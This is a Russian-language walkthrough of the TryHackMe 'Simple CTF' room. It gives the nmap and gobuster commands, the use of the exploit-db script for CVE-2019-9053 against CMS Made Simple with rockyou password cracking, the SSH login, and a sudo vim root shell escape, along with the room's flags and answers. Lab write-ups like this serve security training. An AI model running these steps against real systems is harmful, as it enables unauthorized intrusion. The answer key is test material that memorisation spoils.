[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Simple CTF](https://tryhackme.com/r/room/easyctf) 

Всего 1 задание:
## Задание 1
Разверните машину и попробуйте ответить на вопросы!
### Ответить на вопросы ниже

Сколько служб работает на портах меньше чем 1000?
для того что бы ответить на этот вопрос запустить сканирование через nmap
```commandline
nmap -sC -Cv 10.10.25.90
```
и видим всего 3 порта: 21,80 и 2222, т.о. ответ будет:
```commandline
2
```
Что работает на верхнем порту? под верхним портом понимается набольший (ближе к 65000), т.е. на 2222-м порту
```commandline
ssh
```
в этой комнате будем пытаться взламывать веб-сайт по 80 порту, запустим сканирование через gobuster
```commandline
gobuster dir -u 10.10.25.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
в результате мы найдем страницу http://10.10.25.90/simple/ при переходе на которую мы в нижнем левом углу видим на 
каком CMS эта страницы была создана, ей оказалась "CMS Made Simple 2.2.8"
google - CMS Made Simple 2.2.8 первая же страница https://www.exploit-db.com/exploits/46635 показывает что данная 
CMS уязвима для SQL инъекций и для этой уязвимости подготовлен эксплоит на python (копию файла Вы можете найти https://github.com/BEPb/tryhackme/blob/master/01.easy/Simple%20CTF/exploit.py)
команда для скачивания файла по адресу
```commandline
wget https://www.exploit-db.com/download/46635
```

Какую CVE вы используете против приложения?
```commandline
CVE-2019-9053
```
Какому типу уязвимости подвержено приложение?
```commandline
sqli
```
теперь установим недостающую библиотеку и применим наш эксплойт, который по сути проводит брут-форс атаку, для 
который мы указываем IP-адрес целевой машины и адрес файла для перебора паролей.
```commandline
pip install termcolor
python exploit.py -u http://10.10.25.90/simple --crack -w /usr/share/wordlists/rockyou.txt
```
т.о. получим mitch:secret
Какой пароль?
```commandline
secret
```
как мы помним у нас открыто 3 порта 1-н из которых ssh на 2222-м порту, подключимся к нему командой:
```commandline
ssh mitch@10.10.25.90 -p 2222
```
Где можно войти в систему с полученными данными?
```commandline
ssh
```
```commandline
cat user.txt
```
Что такое флаг пользователя?
```commandline
G00d j0b, keep up!
```
```commandline
cd ..
ls
```
Есть ли еще какой-нибудь пользователь в домашнем каталоге? Как его зовут?
```commandline
sunbath
```
проверим какие файлы мы можем исполнять с правами суперпользователя, и выполним запуск vim с применением команды 
перехода в оболочку `sh` с root правами
```commandline
sudo -l
sudo vim -c ‘:!/bin/sh’
```
Что можно использовать для создания привилегированной оболочки?
```commandline
vim
```
получим рутовый флаг
```commandline
cat /root/root.txt
```
Что такое корневой флаг?
```commandline
W3ll d0n3. You made it!
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)